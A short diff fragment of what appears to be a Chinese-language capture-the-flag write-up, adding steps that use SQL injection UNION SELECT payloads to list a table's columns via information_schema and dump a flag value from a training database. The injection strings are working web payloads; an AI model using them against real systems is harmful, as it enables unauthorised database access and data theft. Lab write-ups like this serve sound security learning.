@@ -357,3 +357,7 @@ hazel{9f2da823-12fd-4ae8-acd2-2f7200071e54}
 接下来
 `1' union select group_concat(column_name) from information_schema.columns where table_name='flag'#`
 列名：flag
+接下来
+`1' union select group_concat(flag) from ctftraining.flag#`
+hazel{31d39468-d3d1-4f6e-b600-30cc5460453d}
+[嘤嘤嘤]sql_
